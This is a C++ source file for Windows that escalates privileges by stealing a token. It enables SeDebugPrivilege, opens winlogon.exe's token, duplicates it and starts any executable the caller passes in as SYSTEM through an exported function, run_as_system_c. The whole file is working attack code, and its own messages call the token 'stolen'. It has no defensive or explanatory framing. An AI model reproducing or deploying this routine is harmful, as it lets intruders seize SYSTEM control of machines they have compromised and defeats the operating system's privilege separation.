#include <windows.h>
//
#include <iostream>
#include <Psapi.h>
#include <Tlhelp32.h>
#include <sddl.h>

#pragma comment(lib, "advapi32.lib")

#define PROCESS_ARRAY 2048

static std::string wcharToString(wchar_t input[1024]) {
	std::wstring wstringValue(input);
	std::string convertedString(wstringValue.begin(), wstringValue.end());

	return convertedString;
}

static int64_t FindProcessPid(const char* appname) {
	DWORD lpidProcess[PROCESS_ARRAY], lpcbNeeded;

	EnumProcesses(lpidProcess, sizeof(lpidProcess), &lpcbNeeded);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 p32;
	p32.dwSize = sizeof(PROCESSENTRY32);

	int64_t processWinlogonPid;
	std::string str_appname = std::string(appname);

	if (Process32First(hSnapshot, &p32)) {
		do {
			if (wcharToString(p32.szExeFile) == str_appname) {
				processWinlogonPid = p32.th32ProcessID;
				return processWinlogonPid;
			}
		} while (Process32Next(hSnapshot, &p32));

		CloseHandle(hSnapshot);
	}
	std::cout << "[!] Failed to find pid of " << str_appname << std::endl;
	return -1;
}

static int EnableSeDebugPrivilegePrivilege() {
	LUID luid;
	HANDLE currentProc =
		OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());
	int ret = -1;

	if (currentProc) {
		HANDLE TokenHandle(NULL);
		BOOL hProcessToken = OpenProcessToken(
			currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
		if (hProcessToken) {
			BOOL checkToken = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);
			if (!checkToken) {
				ret = 0;
			}
			else {
				TOKEN_PRIVILEGES tokenPrivs;

				tokenPrivs.PrivilegeCount = 1;
				tokenPrivs.Privileges[0].Luid = luid;
				tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				BOOL adjustToken = AdjustTokenPrivileges(
					TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES),
					(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

				if (adjustToken != 0) {
					ret = 0;
				}
				else {
					std::cout << "[!] Failed to added SeDebugPrivilege to the current process token" << std::endl;
				}
			}
			CloseHandle(TokenHandle);
		}
		CloseHandle(currentProc);
	}

	return ret;
}

static int CreateImpersonatedProcess(HANDLE NewToken,
	LPCWSTR lpApplicationName, LPWSTR lpCommandLine) {

	STARTUPINFO lpStartupInfo = { 0 };
	PROCESS_INFORMATION lpProcessInformation = { 0 };

	lpStartupInfo.cb = sizeof(lpStartupInfo);

	TCHAR NPath[MAX_PATH];
	if (GetCurrentDirectory(MAX_PATH, NPath) == 0) {
		std::cout << "[!] Failed to get current directory" << std::endl;
		return -1;
	}

	if (!CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE,
		lpApplicationName, lpCommandLine, 0, NULL, NPath,
		&lpStartupInfo, &lpProcessInformation)) {
		std::cout << "[!] Failed to create a new process with the stolen TOKEN" << std::endl;
		return -1;
	}
	return 0;
}

static int StealToken(int TargetPID, LPCWSTR lpApplicationName, LPWSTR lpCommandLine) {
	HANDLE hProcess = NULL;
	HANDLE TokenHandle = NULL;
	HANDLE NewToken = NULL;
	int ret = -1;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, TargetPID);

	if (!hProcess) {
		std::cout << "[!] Failed to obtain a HANDLE to the target PID" << std::endl;
		return -1;
	}

	if (!OpenProcessToken(
		hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
		&TokenHandle)) {
		std::cout << "[!] Failed to obtain a HANDLE to the target TOKEN"
			<< std::endl;
		std::cout << GetLastError();
		goto _exit;
	}

	if (!ImpersonateLoggedOnUser(TokenHandle)) {
		std::cout << "[!] Failed to impersonate the TOKEN's user" << std::endl;
		goto _exit;
	}

	if (!DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL,
		SecurityImpersonation, TokenPrimary, &NewToken)) {
		std::cout << "[!] Failed to duplicate the target TOKEN" << std::endl;
		goto _exit;
	}

	if (CreateImpersonatedProcess(NewToken, lpApplicationName, lpCommandLine) != 0) {
		std::cout << "[!] Failed to create impersonated process" << std::endl;
		goto _exit;
	}

	ret = 0;
_exit:
	if (NewToken) CloseHandle(NewToken);
	if (hProcess) CloseHandle(hProcess);
	if (TokenHandle) CloseHandle(TokenHandle);

	return ret;
}

extern "C" int run_as_system_c(const char* exe, const char* arg) {
	wchar_t wexe[MAX_PATH], * lpApplicationName = NULL;
	wchar_t warg[1024], * lpCommandLine = NULL;

	if (exe && strlen(exe) > 0) {
		std::mbstowcs(wexe, exe, strlen(exe) + 1);
		lpApplicationName = (wchar_t*)wexe;
	}
	if (arg && strlen(arg) > 0) {
		std::mbstowcs(warg, arg, strlen(arg) + 1);
		lpCommandLine = (wchar_t*)warg;
	}

	int winLogonPID = FindProcessPid("winlogon.exe");
	if (winLogonPID < 0) return -1;

	if (EnableSeDebugPrivilegePrivilege() != 0) return -1;

	return StealToken(winLogonPID, lpApplicationName, lpCommandLine);
}